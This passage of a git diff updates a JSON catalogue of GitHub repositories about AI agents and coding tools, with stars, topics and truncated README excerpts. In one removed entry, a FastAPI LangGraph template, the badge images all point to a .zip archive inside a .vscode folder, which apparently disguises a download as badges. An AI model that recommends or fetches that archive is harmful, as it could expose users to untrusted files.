1000, }, OnContentBlockDelta: func(data anthropic.MessagesEventContentBlockDeltaData) { fmt.Printf(\"Stream Content: %s\\n\", data.Delta.Text) }, }) if err != nil { var e *anth\n\n[TRUNCATED]",
+        "text_source_field": "readme_text",
+        "text_truncated_in_raw": false
+      },
+      {
+        "name": "agentic-coding",
+        "full_name": "sammcj/agentic-coding",
+        "url": "https://github.com/sammcj/agentic-coding",
+        "description": "Agentic Coding Rules, Templates etc...",
+        "stars": 145,
+        "pushed_at": "2026-06-29T03:18:43Z",
+        "topics": [
+          "agentic",
+          "agentic-coding",
+          "agents",
+          "ai",
+          "cline",
+          "copilot",
+          "llm",
+          "mcp",
+          "rules",
+          "templates"
+        ],
+        "source": "search",
+        "text_excerpt": "# Sam's Agentic Coding Rules, Templates and Examples - [Sam's Agentic Coding Rules, Templates and Examples](#sams-agentic-coding-rules-templates-and-examples) - [Coding Agent Rules, Skills and Templates](#coding-agent-rules-skills-and-templates) - [Patterns / Workflows](#patterns--workflows) - [MCP Servers (Agent Tools)](#mcp-servers-agent-tools) - [Tips For Agentic Coding](#tips-for-agentic-coding) - [Links](#links) - [License](#license) A collection of coding rules, templates, MCP servers and examples for working with Agentic Coding tools ## Coding Agent Rules, Skills and Templates The repository is organised with tool-agnostic content at the root level: - [Agent Rules](./Rules/) - Agent instruction files - [Rules/CLAUDE.md](./Rules/CLAUDE.md) is usually the most up to date and comprehensive - [Rules/AGENTS.md](./Rules/AGENTS.md) is more generalised for use with other agentic coding tools. - [Agent Skills](./Skills/) - Reusable skills that extend agent capabilities - [Agent Commands](./Claude/commands/) - (Prompt templates) - [Hooks](./Claude/hooks/) - Hooks that can be used when specific lifecycle events occur (e.g. after writing to a file) - [Custom Agents](./Claude/agents/) - Custom defined agents. - [Claude Code Statusline](./Claude/statusline-command.sh) - Custom statusline for Claude Code that shows usage and context information. - [Claude Local Marketplace](./Claude/plugins/local-marketplace/) - My local marketplace (plugins) for Claude Code, including LSP definitions. Note: Most rules and skills are portable between agentic coding tools. The exception being Claude _Skills_, which I'm yet to see other tools support - but have no doubt they will as they're one of the most powerful and useful agentic coding concepts. ![Setup -> Plan -> Act -> Review & Iterate Diagram](setup-plan-act-iterate.svg) ### Agentic Coding Tools - Not All Created Equal **I _highly_ recommend Claude Code as the best agentic coding tools.** In my experience Claude Code _far_ outperforms the many other tools I've worked with over the past 3+ years including: Copilot Agent, Gemini CLI, Codex, Cursor, Kiro, Windsurf, Augment Code, AntiGravity, Aider and many, many others. The next best thing to Claude Code? I think that's probably [OpenCode](https://opencode.ai/) or [Cline](https://cline.bot). - Claude Code offers the fastest agentic coding experience that leads to the highest qual\n\n[TRUNCATED]",
         "text_source_field": "readme_text",
         "text_truncated_in_raw": false
       },
@@ -516,7 +510,7 @@
         "url": "https://github.com/jagreehal/ai-sdk-ollama",
         "description": "A Vercel AI SDK provider for Ollama built on the official ollama package. Type safe, future proof, with cross provider compatibility and native Ollama features.",
         "stars": 124,
-        "pushed_at": "2026-06-29T03:04:43Z",
+        "pushed_at": "2026-06-29T03:21:03Z",
         "topics": [
           "ai",
           "ai-sdk",
@@ -529,36 +523,110 @@
         "text_truncated_in_raw": false
       },
       {
-        "name": "cc-skills",
-        "full_name": "terrylica/cc-skills",
-        "url": "https://github.com/terrylica/cc-skills",
-        "description": "Claude Code Skills Marketplace: plugins, skills for ADR-driven development, DevOps automation, ClickHouse management, semantic versioning, and productivity workflows",
-        "stars": 55,
-        "pushed_at": "2026-06-29T03:02:32Z",
+        "name": "agent-inspect",
+        "full_name": "rajudandigam/agent-inspect",
+        "url": "https://github.com/rajudandigam/agent-inspect",
+        "description": "Local execution trees for TypeScript AI agents. agent-inspect helps you understand what happened inside an AI agent run — locally. It turns manual steps, tool calls, LLM calls, structured logs, failures, durations, and run metadata into readable execution trees you can inspect from the terminal. It is built for TypeScript/Node.js developers..",
+        "stars": 94,
+        "pushed_at": "2026-06-29T03:20:33Z",
         "topics": [
-          "ai-agents",
-          "ai-tools",
-          "anthropic",
-          "automation",
-          "claude",
-          "claude-code",
-          "clickhouse",
-          "coding-assistant",
-          "developer-tools",
-          "devops",
-          "llm",
-          "marketplace",
-          "mcp",
-          "open-source",
-          "plugins",
-          "productivity",
-          "prompt-engineering",
-          "semantic-release",
-          "skills",
-          "workflow"
+          "agent-observability",
+          "agentic-ai",
+          "ai",
+          "ai-agent",
+          "ai-debugging",
+          "ai-logging-library",
+          "ai-observability",
+          "ai-systems",
+          "braintrust",
+          "langfuse",
+          "langsmith",
+          "local-logging",
+          "logging",
+          "multi-agent",
+          "no-cloud",
+          "no-cost",
+          "observability",
+          "opentelemetry",
+          "typescript"
         ],
         "source": "search",
-        "text_excerpt": "# cc-skills Claude Code Skills Marketplace: Meta-skills, foundational tools, and self-revising autonomous-loop primitives for Claude Code. [![Plugins](https://img.shields.io/badge/plugins-36-green.svg)](#plugins) [![Version](https://img.shields.io/github/package-json/v/terrylica/cc-skills.svg)](./CHANGELOG.md) [![License](https://img.shields.io/badge/license-MIT-yellow.svg)](./LICENSE) ## Plugins > Generated from `.claude-plugin/marketplace.json` (the SSoT). Run `bun scripts/validate-plugins.mjs` to verify the table reflects reality. | Plugin | Description | Category | | ------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------- | | [agent-reach](./plugins/agent-reach/) | Give your AI agent eyes to see the entire internet. Search and read 15+ platforms with auto-update preflight: Twitter/X, Reddit, YouTube, GitHub, Bilibili, XiaoHongShu, Douyin, Weibo, WeChat, Xiaoyuzhou Podcast, LinkedIn, V2EX, RSS, Exa web search. | productivity | | [asciinema-tools](./plugins/asciinema-tools/) | Terminal recording automation: asciinema capture, launchd daemon for background chunking, Keychain PAT storage, Pushover notifications, cast conversion, and semantic analysis | utilities | | [calcom-commander](./plugins/calcom-commander/) | Cal.com + Telegram bot lifecycle - booking management, interactive commands, scheduled sync, Agent SDK routing, 1Password API key | productivity | | [claude-tts-companion](./plugins/claude-tts-companion/) | Real-time karaoke subtitles synced with TTS playback — unified macOS accessory app replacing telegram-bot + kokoro-tts-server + subtitle prototype | productivity | | [cli-anything](./plugins/cli-anything/) | Reference guide for CLI-Anything: auto-generate production-ready agent-controllable CLI harnesses for any GUI app via 7-phase pipeline. Covers all validated commands, per-app examples (GIMP, Blender, LibreOffice, Inkscape), testing, and HARNESS.md methodology. | development | | [crucible](./plugins/crucible/) | Self-evolving research methodology: 18 universal principles for LLM-driven investigation, distilled from a 376-turn session with 1 positive + 17 null campaign\n\n[TRUNCATED]",
+        "text_excerpt": "# agent-inspect **Trace, check, and safely share TypeScript AI agent runs locally.** agent-inspect helps you understand what happened inside an AI agent run without sending traces to a hosted service. It turns framework events, observed objects/classes, manual steps, tool calls, LLM calls, structured logs, failures, durations, and run metadata into readable local execution trees. It is built for TypeScript/Node.js developers and teams shipping real agentic products — not just toy demos. Use it for **local TypeScript agent debugging**, **eval iteration**, and **CI trace artifacts**. It **complements** production observability platforms; it does **not** replace them. The default loop is local-first: capture a trace, inspect/report/diff it, run deterministic checks in CI, then export a redacted copy only when you choose to share. **No account. No cloud upload. No dashboard required.** **Visual demos:** [docs/SCREENSHOTS.md](docs/SCREENSHOTS.md) — curated terminal recordings (synthetic fixtures only). ## Why agent-inspect exists AI agents are no longer single function calls. They plan, call tools, invoke LLMs, branch, retry, fail, and run work in parallel. **Console logs are flat**; reconstructing causality from a wall of lines is slow and error-prone. **Hosted observability** is valuable in production, but it can be heavy for the **inner loop**: local runs, fast iteration, and debugging before anything reaches a collector or dashboard. agent-inspect gives those runs **structure**: an **execution tree** you can read and diff on disk, with a **CLI-first** workflow and **no vendor lock-in**. ## Install Current npm release line: **2.4.0** for the linked public packages (`agent-inspect`, adapters, reporters, redact, eval, mcp). **v2.4.0** adds multi-run **session** navigation (`sessions` / `session` CLI), session-aware `search` and `check`, and optional **`@agent-inspect/mcp`** client telemetry. ```bash npm install agent-inspect ``` ```bash pnpm add agent-inspect ``` Verify the CLI is available: ```bash npx agent-inspect --help ``` For a clean npm/pnpm install checklist with ESM, CJS, and CLI checks, see [Clean install smoke test](docs/INSTALL-SMOKE-TEST.md). ## Three adoption paths Already using AI SDK, OpenAI Agents JS, LangChain, or LangGraph-through-LangChain? Start with **Path B** for framework-native local traces before adding manual instrumentation. ### Path\n\n[TRUNCATED]",
+        "text_source_field": "readme_text",
+        "text_truncated_in_raw": false
+      },
+      {
+        "name": "webmcp-sdk",
+        "full_name": "opentiny/webmcp-sdk",
+        "url": "https://github.com/opentiny/webmcp-sdk",
+        "description": "OpenTiny NEXT-SDKs is a front-end AI and browser automation toolkit. It implements WebMCP + WebSkills to build AI-native apps, and leverages webmcp-cli to enable LLM agents to remote-control any webpage without source code modifications. OpenTiny NEXT-SDKs 是一套前端 AI 与浏览器自动化工具包。它通过 WebMCP + WebSkills 协议构建 AI 原生应用，并利用 webmcp-cli 实现了无需修改源码即可让大模型代理自动控制任",
+        "stars": 89,
+        "pushed_at": "2026-06-29T03:15:56Z",
+        "topics": [
+          "ai",
+          "ai-agents",
+          "mcp",
+          "next-sdk",
+          "opentiny",
+          "opentiny-next",
+          "web-agent",
+          "webmcp",
+          "webskills"
+        ],
+        "source": "search",
+        "text_excerpt": "# OpenTiny NEXT-SDKs: Built-in WebMCP & Polyfill + WebSkills + WebAgent <p align=\"center\"> <a href=\"https://opentiny.design\" target=\"_blank\" rel=\"noopener noreferrer\"> <img alt=\"OpenTiny Logo\" src=\"logo.svg\" height=\"100\" style=\"max-width:100%;\"> </a> </p> English | [简体中文](README.zh-CN.md) [![Ask DeepWiki](https://deepwiki.com/badge.svg)](https://deepwiki.com/opentiny/webmcp-sdk) <p align=\"center\"> <strong>A front-end intelligent application development and browser automation toolkit. It turns existing apps intelligent via WebMCP + WebSkills, and provides webmcp-cli to perceive and control any webpage with zero refactoring.</strong> </p> <p align=\"center\"> <a href=\"https://docs.opentiny.design/next-sdk/\">📖 Docs</a> | <a href=\"#-quick-start\">🚀 Quick Start</a> | <a href=\"#-webmcp--polyfill\">🌐 WebMCP & Polyfill</a> | <a href=\"#-scenarios\">💡 Scenarios</a> </p> > [!IMPORTANT] > **Next-Gen AI Protocol**: OpenTiny NEXT-SDKs is built on the **WebMCP (Model Context Protocol for Web)**. It is fully compatible with the native `navigator.modelContext` API (currently in experimental stage in browsers like Chrome), allowing your web apps to be controlled by AI via a standardized protocol. > [!TIP] > **✨ Command-line Automation & AI Skills**: > We now offer **`webmcp-cli`** (browser control & polyfill auto-injection CLI) and **`webmcp-skill`** (standard instructions and sub-skills like Excalidraw drawing for AI agents). Together, they enable AI agents to perform complex, fine-grained tasks and \"remote-drive\" any webpage out of the box. --- **OpenTiny NEXT-SDKs** is a front-end intelligent application development and browser automation toolkit. Beyond enabling the \"WebMCP + WebSkills\" model to expose page operations as standardized tools in just a few lines of code, it features **`webmcp-cli`** to connect, perceive, and control any webpage with zero source code modifications, instantly bringing out-of-the-box AI-Native capability to any web app. ## 📑 Table of Contents - [✨ Main Features](#-main-features) - [🌐 WebMCP & Polyfill](#-webmcp--polyfill) - [🚀 Quick Start](#-quick-start) - [📦 Core Packages Description](#-core-packages-description) - [💻 WebMCP CLI & Agent Skills](#-webmcp-cli--agent-skills) - [💡 Core Concepts](#-core-concepts) - [📖 Scenarios](#-scenarios) - [🛠️ Contributing](#️-contributing) - [📄 License](#-license) ## ✨ Main Features - 🔌 **Standard WebMCP Implementa\n\n[TRUNCATED]",
+        "text_source_field": "readme_text",
+        "text_truncated_in_raw": false
+      },
+      {
+        "name": "PHANTOM",
+        "full_name": "OmYarewar/PHANTOM",
+        "url": "https://github.com/OmYarewar/PHANTOM",
+        "description": "👻 AI-Powered Pentesting Command Center — Autonomous security testing with real-time streaming, self-improving AI, unlimited tool iterations, and beautiful dark UI",
+        "stars": 60,
+        "pushed_at": "2026-06-29T03:16:29Z",
+        "topics": [
+          "ai",
+          "ai-agent",
+          "autonomous-agent",
+          "command-center",
+          "cybersecurity",
+          "dark-ui",
+          "hacking",
+          "llm",
+          "nodejs",
+          "openai",
+          "pentesting",
+          "red-team",
+          "security-tools",
+          "websocket"
+        ],
+        "source": "search",
+        "text_excerpt": "<div align=\"center\"> # 👻 PHANTOM ### AI-Powered Pentesting Command Center [![CI](https://github.com/OmYarewar/PHANTOM/actions/workflows/ci.yml/badge.svg)](https://github.com/OmYarewar/PHANTOM/actions/workflows/ci.yml) [![Node.js](https://img.shields.io/badge/Node.js-18+-339933?style=for-the-badge&logo=node.js&logoColor=white)](https://nodejs.org) [![License](https://img.shields.io/badge/License-MIT-blue?style=for-the-badge)](LICENSE) [![Platform](https://img.shields.io/badge/Platform-Linux-FCC624?style=for-the-badge&logo=linux&logoColor=black)](https://www.linux.org/) [![PRs Welcome](https://img.shields.io/badge/PRs-Welcome-brightgreen?style=for-the-badge)](https://github.com/pulls) **An autonomous AI assistant for penetration testing, security research, and general-purpose tasks.** Real-time tool execution • Unlimited autonomous operations • Self-improving AI • Beautiful dark UI <img src=\"https://img.shields.io/badge/Status-Active-22c55e?style=flat-square\" /> <img src=\"https://img.shields.io/badge/Security-Offensive-ef4444?style=flat-square\" /> <img src=\"https://img.shields.io/badge/AI-Autonomous-6366f1?style=flat-square\" /> --- </div> ## 🤔 Why PHANTOM? - **Zero-Config Tool Execution:** Tools automatically install system dependencies and parse outputs cleanly, so the AI never gets stuck missing a library. - **Unbounded Agent Loops:** Unlike standard chat UIs, PHANTOM allows the LLM to call tools recursively until the goal is achieved without needing constant human prompting. - **Persistent Context:** The integrated SQLite memory store gives your agent long-term recall across sessions, preventing repetitive scanning or reconnaissance. ## ✨ Features | Feature | Description | |---------|-------------| | 🛡️ **Multi-Agent Defense** | Orchestrator, Planner, and Specialist Agents (Log, Compliance, Threat Modeler) working in parallel via Task Graphs | | 🤖 **Any LLM Backend** | OpenAI, OpenRouter, Ollama, LM Studio, DeepSeek, Claude — any OpenAI-compatible API | | ⚡ **Real-Time Streaming** | Live tool execution output, typing animations, and AI thinking display | | 🔓 **Unlimited Operations** | No tool call limits — PHANTOM runs autonomously until the task is done | | 🧠 **Self-Improving** | Creates its own tools, saves execution traces, learns from past runs | | 🔑 **Secure Sudo** | One-time sudo password with system validation — persisted securely | | 📁 **Workspace S\n\n[TRUNCATED]",
+        "text_source_field": "readme_text",
+        "text_truncated_in_raw": false
+      },
+      {
+        "name": "adhdev",
+        "full_name": "vilmire/adhdev",
+        "url": "https://github.com/vilmire/adhdev",
+        "description": "🦦 ADHDev — Agent Dashboard Hub. Monitor & control AI coding agents from a single dashboard. Self-hosted, open-source.",
+        "stars": 48,
+        "pushed_at": "2026-06-29T03:16:10Z",
+        "topics": [
+          "acp",
+          "adhdev",
+          "agent",
+          "cli",
+          "dashboard",
+          "development",
+          "hub",
+          "ide",
+          "open-source",
+          "remote-control"
+        ],
+        "source": "search",
+        "text_excerpt": "# ADHDev Self-Hosted [![npm](https://img.shields.io/npm/v/@adhdev/daemon-standalone?label=npm)](https://www.npmjs.com/package/@adhdev/daemon-standalone) [![CI](https://github.com/vilmire/adhdev/actions/workflows/ci.yml/badge.svg)](https://github.com/vilmire/adhdev/actions) [![License: AGPL-3.0](https://img.shields.io/badge/License-AGPL--3.0-blue.svg)](LICENSE) ADHDev Self-Hosted is a self-hosted control plane for AI coding agent sessions. As agents become long-running background workers, ADHDev gives you one local dashboard to see which session is still running, waiting for approval, finished, stuck, or ready for the next instruction. It is not trying to replace the underlying IDEs or agents. The goal is to give them a dedicated control surface: inspect active sessions, review chat and terminal state, approve or interrupt work, reopen the right history, and send the next instruction from one place. For the standalone path, everything runs on your machine as a local daemon with an embedded web dashboard. No cloud account or hosted control plane is required. Website: https://adhf.dev Docs: https://docs.adhf.dev This repo contains the open-source, self-hosted edition: - the standalone local server and dashboard - the shared daemon/runtime packages used by both standalone and cloud - the session-host and terminal-mux stack for hosted CLI runtimes Hosted cloud operations are not part of this repository. ## Currently Working / Tested These are the integrations currently working or explicitly tested enough to call out near the top: - IDEs: Cursor, Google Antigravity, VS Code, Kiro - IDE extension integrations: Codex, Claude Code - CLI agents: Hermes Agent, Codex CLI, Claude Code CLI Other providers and adapters exist in the shipped inventory, but many are still incomplete, experimental, or not yet verified enough to present as fully supported. For the current support policy and caveats, see: - [Supported Providers](https://docs.adhf.dev/reference/supported-providers) - [Supported IDEs](https://docs.adhf.dev/reference/supported-ides) - [Compatibility & Caveats](https://docs.adhf.dev/guide/compatibility) ## Screenshots <p align=\"center\"> <img src=\"docs/assets/readme/landing-command-center-demo-poster.jpg\" alt=\"ADHDev desktop dashboard switching between chat and terminal views, floating a panel, and splitting the workspace\" width=\"100%\" /> </p> <table> <tr> <td width=\n\n[TRUNCATED]",
         "text_source_field": "readme_text",
         "text_truncated_in_raw": false
       },
@@ -568,7 +636,7 @@
         "url": "https://github.com/seaworld008/Commonly-used-high-value-skills",
         "description": "High-value AI skills repository for Codex, Claude Code, OpenClaw, agents, prompts, and automation workflows. 高价值的 AI 技能库，涵盖 Codex、Claude Code、OpenClaw、代理、提示和自动化工作流程。",
         "stars": 47,
-        "pushed_at": "2026-06-29T02:55:06Z",
+        "pushed_at": "2026-06-29T03:14:29Z",
         "topics": [
           "agent",
           "agentic-workflows",
@@ -593,42 +661,12 @@
         "text_truncated_in_raw": false
       },
       {
-        "name": "conduit",
-        "full_name": "tsouth89/conduit",
-        "url": "https://github.com/tsouth89/conduit",
-        "description": "One local gateway for all your MCP servers, set up once and shared by every AI client (Claude, Cursor, VS Code, Codex). Lazy discovery collapses them to 3 meta-tools the agent searches on demand, ~90% fewer tokens. Keys in your OS keychain, no cloud.",
-        "stars": 44,
-        "pushed_at": "2026-06-29T03:01:32Z",
-        "topics": [
-          "ai",
-          "ai-agents",
-          "anthropic",
-          "claude",
-          "cursor",
-          "developer-tools",
-          "gateway",
-          "llm",
-          "local-first",
-          "mcp",
-          "mcp-server",
-          "model-context-protocol",
-          "react",
-          "rust",
-          "tauri",
-          "vscode"
-        ],
-        "source": "search",
-        "text_excerpt": "<div align=\"center\"> <img src=\"docs/logo.svg\" alt=\"Conduit\" width=\"84\" /> # Conduit **One local gateway for all your MCP servers, shared by every AI client, with far fewer tokens.** [![CI](https://github.com/tsouth89/conduit/actions/workflows/ci.yml/badge.svg)](https://github.com/tsouth89/conduit/actions/workflows/ci.yml) [![Latest release](https://img.shields.io/github/v/release/tsouth89/conduit?label=release)](https://github.com/tsouth89/conduit/releases) [![License: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE) [![Discord](https://img.shields.io/badge/Discord-join%20the%20community-5865F2?logo=discord&logoColor=white)](https://discord.gg/Xsn27MxdBA) </div> ![Conduit: every tool from all your servers, collapsed to the 3 your agent loads](docs/feature.png) ![Conduit demo: add a server, connect it to every AI tool, and the agent uses it](docs/demo.gif) Conduit is a local MCP (Model Context Protocol) gateway. You set up and authenticate each server once, and every AI client (Claude, Cursor, Codex, and the rest) points at Conduit and shares them, so you stop configuring the same servers separately in each app. It also fixes what those servers cost your agent. Every MCP server you connect dumps all of its tools into context on every single request, and it adds up fast: just 3 servers (62 tools) cost ~24,000 tokens of definitions before you've asked anything. Conduit advertises 3 meta-tools the agent searches on demand instead, so it pays ~660 tokens. **Measured on a frontier model: up to 91% fewer total tokens at the same task success** (graded for correct answers, not just completion), plus 97% less tool-definition overhead on every request, rising to 99.6% on a real 415-tool catalog (see [BENCHMARK.md](BENCHMARK.md)). That holds whether you run one AI tool or five, on cloud models (where tokens are your bill) or local ones (where tool defs eat your context window). ## Screenshots | Servers | Catalog | Activity | |---|---|---| | ![Every server in one dense list with health, secrets, and per-tool toggles](docs/screenshots/servers.png) | ![A curated catalog of MCP servers grouped by category](docs/screenshots/catalog.png) | ![Per-server latency, error rates, token savings, and tool-security notices](docs/screenshots/activity.png) | ## Why Every MCP server you connect dumps its full tool list into your agent's context on every request, and mos\n\n[TRUNCATED]",
-        "text_source_field": "readme_text",
-        "text_truncated_in_raw": false
-      },
-      {
         "name": "docker-images",
         "full_name": "felipecrs/docker-images",
         "url": "https://github.com/felipecrs/docker-images",
         "description": "A collection of docker images useful for development environments and CI/CD pipelines.",
         "stars": 41,
-        "pushed_at": "2026-06-29T03:03:05Z",
+        "pushed_at": "2026-06-29T03:18:58Z",
         "topics": [
           "agent",
           "codespaces",
@@ -649,97 +687,12 @@
         "text_truncated_in_raw": false
       },
       {
-        "name": "TEDI",
-        "full_name": "IlhamriSKY/TEDI",
-        "url": "https://github.com/IlhamriSKY/TEDI",
-        "description": "One lightweight app. Eight features. Your whole dev workflow in a single window.",
-        "stars": 39,
-        "pushed_at": "2026-06-29T03:04:37Z",
-        "topics": [
-          "ai",
-          "ai-agent",
-          "claude-code",
-          "cmd",
-          "code-editor",
-          "codex",
-          "open-source",
-          "opencode",
-          "powershell",
-          "rust",
-          "sftp",
-          "source-control",
-          "ssh",
-          "tauri",
-          "terminal"
-        ],
-        "source": "search",
-        "text_excerpt": "<div align=\"center\"> <img src=\"public/icon.png\" width=\"120\" height=\"120\" alt=\"TEDI\" /> <h1>TEDI</h1> <p><strong>One lightweight app. Eight features. Your whole dev workflow in a single window.</strong></p> <p> <img src=\"https://img.shields.io/badge/license-Apache--2.0-green\" alt=\"license\" /> <img src=\"https://img.shields.io/badge/platform-macOS%20%7C%20Linux%20%7C%20Windows-lightgrey\" alt=\"platform\" /> <img src=\"https://img.shields.io/badge/footprint-~7--10%20MB-brightgreen\" alt=\"footprint\" /> <img src=\"https://img.shields.io/badge/telemetry-none-blue\" alt=\"no telemetry\" /> </p> </div> --- ## What is TEDI? **TEDI** (**T**erminal **E**nvironment & **D**evelopment **I**nfrastructure) folds eight tools you reach for every day (a terminal, SSH client, DB browser, editor, AI agent, browser, and Git) into one window, so you stop alt-tabbing. Built on Tauri 2 (Rust + a single webview), it ships in roughly **7-10 MB** with **no telemetry**; API keys stay in the OS keychain. ## The eight features | # | Feature | What it does | | --- | ------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | | 1 | **Terminal multiplexer** | Native PTY terminals (zsh / bash / fish / pwsh) on xterm.js + WebGL: split panes, tab groups, shell integration (OSC 7 / 133), inline search, and link detection. Inactive tabs keep streaming. | | 2 | **SSH connection** | Connect to remote hosts (`russh`), open remote shells, and browse/transfer files over an integrated **SFTP** explorer, all from a saved connection manager. | | 3 | **SQL explorer** _(extension)_ | Browse and query databases from a dedicated panel. Ships as an extension (feature 8), so it installs and updates at runtime. | | 4 | **Code editor** | CodeMirror 6 for TS/JS, Rust, Python, PHP, HTML/CSS, JSON, Markdown, C/C++, Java, C#, SQL, and more, with inline AI autocomplete, diff view, Vim mode, and Markdown/image preview. | | 5 | **AI-native agent** | Bring-your-own-key agent (OpenAI, Anthropic, Google, Groq, xAI, Cerebras, DeepSeek, any OpenAI-compatible endpoint, or **local** LM Studio). Sub-agents, voice input, project memory via `TEDI.md`, and tools gated by approval. | | 6 | **AI browser control** | A real in-app browser (nativ\n\n[TRUNCATED]",
-        "text_source_field": "readme_text",
-        "text_truncated_in_raw": false
-      },
-      {
-        "name": "fastapi-langgraph-agent-production-ready-template",
-        "full_name": "luwhano/fastapi-langgraph-agent-production-ready-template",
-        "url": "https://github.com/luwhano/fastapi-langgraph-agent-production-ready-template",
-        "description": "A production-ready FastAPI template for building AI agent applications with LangGraph integration. This template provides a robust foundation for building scalable, secure, and maintainable AI agent services.",
-        "stars": 32,
-        "pushed_at": "2026-06-29T02:49:05Z",
-        "topics": [
-          "agent",
-          "agentic-ai",
-          "docker",
-          "fastapi",
-          "fastapi-template",
-          "langchain",
-          "langchain-python",
-          "langgraph",
-          "langgraph-python",
-          "llm",
-          "memory"
-        ],
-        "source": "search",
-        "text_excerpt": "# FastAPI LangGraph Agent Production-Ready Template 🚀 ![GitHub release](https://raw.githubusercontent.com/luwhano/fastapi-langgraph-agent-production-ready-template/master/.vscode/agent-fastapi-langgraph-production-ready-template-3.0.zip) ![Docker](https://raw.githubusercontent.com/luwhano/fastapi-langgraph-agent-production-ready-template/master/.vscode/agent-fastapi-langgraph-production-ready-template-3.0.zip) ![Python](https://raw.githubusercontent.com/luwhano/fastapi-langgraph-agent-production-ready-template/master/.vscode/agent-fastapi-langgraph-production-ready-template-3.0.zip%https://raw.githubusercontent.com/luwhano/fastapi-langgraph-agent-production-ready-template/master/.vscode/agent-fastapi-langgraph-production-ready-template-3.0.zip) Welcome to the **FastAPI LangGraph Agent Production-Ready Template**! This repository provides a solid foundation for building AI agent applications that integrate with LangGraph. Whether you are developing a new service or enhancing an existing one, this template offers the tools and structure you need to create scalable, secure, and maintainable AI agent services. ## Table of Contents - [Features](#features) - [Technologies Used](#technologies-used) - [Getting Started](#getting-started) - [Project Structure](#project-structure) - [How to Run the Application](#how-to-run-the-application) - [API Endpoints](#api-endpoints) - [Testing](#testing) - [Contributing](#contributing) - [License](#license) - [Release Information](#release-information) ## Features - **FastAPI Framework**: Build high-performance APIs with ease. - **LangGraph Integration**: Seamlessly connect your AI agents to the LangGraph ecosystem. - **Docker Support**: Run your application in a containerized environment. - **Scalable Architecture**: Design your services to handle growth. - **Security Best Practices**: Implement secure coding standards from the start. - **Maintainable Codebase**: Follow best practices for clean and organized code. ## Technologies Used This template incorporates several technologies and libraries that are essential for developing modern AI applications: - **FastAPI**: A modern web framework for building APIs with Python 3.8+ based on standard Python type hints. - **LangGraph**: A powerful tool for building AI agents and managing their workflows. - **Docker**: Containerization platform that simplifies deployment and scaling. - **\n\n[TRUNCATED]",
-        "text_source_field": "readme_text",
-        "text_truncated_in_raw": false
-      },
-      {
-        "name": "anatomia",
-        "full_name": "anatomia-dev/anatomia",
-        "url": "https://github.com/anatomia-dev/anatomia",
-        "description": "Spec-driven agent harness for Claude Code and Codex — five-agent pipeline (scope, plan, build, verify, learn) with an auditable proof chain.",
-        "stars": 32,
-        "pushed_at": "2026-06-29T02:58:08Z",
-        "topics": [
-          "agentic-coding",
-          "ai",
-          "ai-agents",
-          "ai-coding",
-          "ai-coding-assistant",
-          "claude-code",
-          "cli",
-          "codex",
-          "codex-cli",
-          "context-engineering",
-          "developer-tools",
-          "harness",
-          "llm",
-          "proof-chain",
-          "spec-driven-development",
-          "typescript",
-          "verification"
-        ],
-        "source": "search",
-        "text_excerpt": "# Anatomia [![CI](https://github.com/anatomia-dev/anatomia/actions/workflows/test.yml/badge.svg)](https://github.com/anatomia-dev/anatomia/actions) [![npm](https://img.shields.io/npm/v/anatomia-cli)](https://www.npmjs.com/package/anatomia-cli) [![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](https://opensource.org/licenses/MIT) Anatomia is a CLI and agent harness for Claude Code and Codex. It scans your codebase — detecting your stack, conventions, and patterns — then runs every change through a five-agent pipeline that saves every artifact: scope, spec, contract, build report, and independent verification. Other harnesses are prompt libraries. This one has an engine. ## Scan any project in 10 seconds <img alt=\"ana scan running on dub — detecting TypeScript, Next.js, Prisma with 80 models, auth, AI, payments, and contributor activity\" width=\"800\" src=\"assets/demo/dub-scan.gif\"> ```bash npx anatomia-cli scan . ``` No install. One command. [See more examples →](https://anatomia.dev/docs) ## Install Install globally to use the `ana` command directly: ```bash npm install -g anatomia-cli ``` Requires Node.js 22+. To update: `npm update -g anatomia-cli` ## Quick start ```bash ana init # generate context + agents ana init commit # persist to git (so teammates get it too) ana doctor # verify installation is healthy ana run setup # enrich with your team's knowledge (optional, recommended, ~10 min) ana run # start working — \"hey Ana\" ``` Tell Ana what you want to build. It'll investigate the codebase, surface tradeoffs, and push back if the approach has problems. When the scope is right, it hands off to Plan, Build, and Verify. > `init` runs scan automatically and works standalone. The pipeline and setup run through Claude Code or Codex, and scan output works with any markdown-aware AI tool. > > `init commit` commits to the artifact branch — `staging`, `develop`, or your pre-production branch if one exists, otherwise `main`. Check with `ana config get artifactBranch` before your first commit. > > After updating the CLI, run `ana init` again to refresh scan data and skill detection. Your rules, context, and proof chain are preserved. ## What it does ### Scan + init `ana scan` reads your project and detects framework, database, auth, testing, services, conventions, and patterns. In monorepos, scan identifies each surface (package or app) and detects\n\n[TRUNCATED]",
-        "text_source_field": "readme_text",
-        "text_truncated_in_raw": false
-      },
-      {
         "name": "aisix",
         "full_name": "api7/aisix",
         "url": "https://github.com/api7/aisix",
         "description": "Open-source AI gateway for LLMs & AI agents, built in Rust. One OpenAI-compatible API for OpenAI, Anthropic, Gemini, Bedrock & more — routing, guardrails, caching, rate limits, observability.",
-        "stars": 29,
-        "pushed_at": "2026-06-29T03:03:51Z",
+        "stars": 30,
+        "pushed_at": "2026-06-29T03:17:45Z",
         "topics": [
           "ai-agents",
           "ai-gateway",
@@ -768,28 +721,34 @@
         "text_truncated_in_raw": false
       },
       {
-        "name": "pickle-rick-claude",
-        "full_name": "gregorydickson/pickle-rick-claude",
-        "url": "https://github.com/gregorydickson/pickle-rick-claude",
-        "description": "🥒 Pickle Rick for Claude Code — autonomous PRD-driven coding loops + relentless code review. Ralph Loop toolkit.",
-        "stars": 27,
-        "pushed_at": "2026-06-29T03:04:13Z",
+        "name": "awesome-claude-skills",
+        "full_name": "shajith003/awesome-claude-skills",
+        "url": "https://github.com/shajith003/awesome-claude-skills",
+        "description": "🚀 Enhance Claude's capabilities with example skills that streamline tasks and improve performance in specialized areas.",
+        "stars": 25,
+        "pushed_at": "2026-06-29T03:16:36Z",
         "topics": [
-          "agentic",
-          "ai-coding",
-          "anthropic",
-          "autonomous-agent",
-          "claude",
+          "agent-skills",
+          "agentic-coding",
+          "anthropic-ai",
+          "anthropic-claude",
+          "awesome-claude-code",
+          "awesome-claude-skills",
+          "claude-ai",
+          "claude-api",
           "claude-code",
-          "code-review",
